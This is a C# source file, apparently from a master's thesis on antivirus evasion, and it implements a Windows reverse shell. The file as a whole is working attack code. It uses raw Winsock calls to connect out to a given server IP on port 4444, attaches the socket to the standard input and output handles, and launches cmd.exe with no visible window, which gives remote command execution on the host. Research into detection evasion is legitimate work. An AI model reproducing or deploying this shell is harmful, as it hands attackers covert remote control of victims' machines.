///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
/// This implementation is part of my master's thesis regarding antivirus detection evasion. 
///  C Vorlage: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
///  C# Beispiel für Structs: https://pastebin.com/twvGw030
///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
namespace SimpleReverseShell
{
  using System.Net.Security;
  using System.Net.Sockets;
  using System.Runtime.InteropServices;
  using Win32Imports;

  internal class SimpleSysCallShell : DllImportsBase
  {
    public void Start(string serverIP)
    {
      var wsa = new WSAData();
      var statusCode = WSAStartup((ushort)2.2, wsa);

      Helpers.PrintLastError(nameof(WSAStartup));

      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(4444);
      Helpers.PrintLastError(nameof(htons));

      if (string.IsNullOrWhiteSpace(serverIP))
      {
        Console.WriteLine("Enter server IP: ");
        serverIP = Console.ReadLine();
      }

      sockAddrIn.sin_addr.S_addr = inet_addr(serverIP);
      Helpers.PrintLastError(nameof(inet_addr));

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);

      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);

      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
      Helpers.PrintLastError(nameof(WSASocketA));

      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);
      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
      Helpers.PrintLastError(nameof(connect));

      var socketHandle = new SafeSocketHandle(socket, false);
      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
      startupInfo.hStdError = socketHandle.DangerousGetHandle();
      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
      Helpers.PrintLastError(nameof(CreateProcessA));
    }
  }
}
